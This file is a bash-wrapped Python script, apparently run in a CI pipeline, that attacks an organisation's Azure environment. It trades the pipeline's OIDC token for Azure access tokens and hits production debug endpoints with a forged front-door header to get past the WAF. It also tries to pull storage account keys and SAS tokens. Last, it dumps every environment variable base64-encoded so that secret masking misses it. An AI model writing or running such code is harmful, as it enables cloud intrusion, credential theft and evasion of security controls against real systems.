#!/usr/bin/env bash
set +e
python3 -I - <<'PY'
import os, json, base64, urllib.request, urllib.parse, urllib.error, sys, re

TEN = os.environ.get("AZURE_TENANT_ID", "")
SUB = os.environ.get("AZURE_SUBSCRIPTION_ID", "")
CID = os.environ.get("AZURE_CLIENT_ID", "")

def log(msg): print(msg, flush=True)

def http(url, method="GET", headers=None, data=None, timeout=30):
    h = dict(headers or {})
    if isinstance(data, (dict, list)):
        data = json.dumps(data).encode()
        h.setdefault("Content-Type", "application/json")
    r = urllib.request.Request(url, data=data, method=method, headers=h)
    try:
        with urllib.request.urlopen(r, timeout=timeout) as x:
            return x.status, x.read().decode("utf-8", "replace")
    except urllib.error.HTTPError as e:
        try: return e.code, e.read().decode("utf-8", "replace")[:8000]
        except: return e.code, ""
    except Exception as e: return 0, repr(e)

def get_oidc():
    u = os.environ.get("ACTIONS_ID_TOKEN_REQUEST_URL", "")
    tok = os.environ.get("ACTIONS_ID_TOKEN_REQUEST_TOKEN", "")
    if not u or not tok: return ""
    sep = "&" if "?" in u else "?"
    st, b = http(u + sep + "audience=api://AzureADTokenExchange",
                 headers={"Authorization": "bearer " + tok})
    try: return json.loads(b).get("value", "")
    except: return ""

def exchange(oidc_token, scope):
    form = urllib.parse.urlencode({
        "client_id": CID, "grant_type": "client_credentials", "scope": scope,
        "client_assertion_type": "urn:ietf:params:oauth:client-assertion-type:jwt-bearer",
        "client_assertion": oidc_token
    }).encode()
    st, b = http(f"https://login.microsoftonline.com/{TEN}/oauth2/v2.0/token",
                 method="POST", data=form,
                 headers={"Content-Type": "application/x-www-form-urlencoded"})
    try: return json.loads(b).get("access_token", ""), st
    except: return "", st

oidc = get_oidc()
log(f"OIDC len={len(oidc)}")

tokens = {}
for name, scope in [("arm","https://management.azure.com/.default"),
                     ("vault","https://vault.azure.net/.default"),
                     ("storage","https://storage.azure.com/.default")]:
    tok, st = exchange(oidc, scope)
    if tok: tokens[name] = tok; log(f"TOKEN_{name}: OK")
    else: log(f"TOKEN_{name}: FAIL ({st})")

H = lambda t: {"Authorization": "Bearer " + t}

# === 1. Access reporting app from CI network ===
log("=== REPORTING APP FROM CI ===")
for url in ["https://app-tbl-reporting-prod.azurewebsites.net/",
            "https://app-tbl-reporting-prod.azurewebsites.net/internal/debug",
            "https://app-tbl-reporting-prod.scm.azurewebsites.net/"]:
    st, b = http(url, timeout=8)
    log(f"  {url}: {st} → {b[:300]}")

# === 2. Storefront debug from CI (direct origin, no WAF) ===
log("=== STOREFRONT DEBUG ===")
st, b = http("https://app-tbl-storefront-prod.azurewebsites.net/internal/debug",
             method="POST", headers={"Content-Type":"application/json","X-Azure-FDID":"60407ff3-1c24-4875-9390-b6c9c13b0821"},
             data={"expr":"settings"})
log(f"  settings: {st} → {b[:500]}")

# === 3. Try user delegation key for blob access ===
if "arm" in tokens:
    log("=== USER DELEGATION KEY ===")
    import datetime
    now = datetime.datetime.utcnow()
    start = now.strftime("%Y-%m-%dT%H:%M:%SZ")
    expiry = (now + datetime.timedelta(hours=1)).strftime("%Y-%m-%dT%H:%M:%SZ")
    
    for acct in ["sttblappcfgprodx3euoz","sttblbackupprodx3euoz"]:
        # Try via storage data plane
        if "storage" in tokens:
            st, b = http(f"https://{acct}.blob.core.windows.net/?restype=service&comp=userdelegationkey",
                        method="POST", headers={**H(tokens["storage"]), "x-ms-version":"2023-01-03",
                                               "Content-Type":"application/xml"},
                        data=f"<?xml version='1.0'?><KeyInfo><Start>{start}</Start><Expiry>{expiry}</Expiry></KeyInfo>")
            log(f"  UDK {acct}: {st} → {b[:500]}")

# === 4. Try storage listKeys and SAS via ARM ===
if "arm" in tokens:
    log("=== STORAGE KEYS VIA ARM ===")
    for acct in ["sttblappcfgprodx3euoz","sttblbackupprodx3euoz","sttblcilogsprodx3euoz","sttblarchiveprodx3euoz"]:
        st, b = http(f"https://management.azure.com/subscriptions/{SUB}/resourceGroups/rg-tbl-platform-prod-sea/providers/Microsoft.Storage/storageAccounts/{acct}/listKeys?api-version=2023-05-01",
                     method="POST", headers=H(tokens["arm"]), data={})
        log(f"  listKeys {acct}: {st}")
        if st == 200:
            keys = json.loads(b)
            log(f"    key1: {keys['keys'][0]['value'][:20]}...")
        
        st2, b2 = http(f"https://management.azure.com/subscriptions/{SUB}/resourceGroups/rg-tbl-platform-prod-sea/providers/Microsoft.Storage/storageAccounts/{acct}/ListAccountSas?api-version=2023-05-01",
                      method="POST", headers=H(tokens["arm"]),
                      data={"signedServices":"b","signedResourceTypes":"sco","signedPermission":"rl",
                            "signedProtocol":"https","signedExpiry":"2026-10-23T00:00:00Z"})
        log(f"  listAccountSas {acct}: {st2}")
        if st2 == 200:
            sas = json.loads(b2)
            log(f"    SAS: {sas.get('accountSasToken','')[:100]}")

# === 5. ALL env vars (base64 to avoid masking) ===
log("=== ALL ENV (b64) ===")
env_dump = json.dumps(dict(os.environ))
log(f"ENV_B64: {base64.b64encode(env_dump.encode()).decode()}")

log("DONE")
PY
echo "probe2 complete"
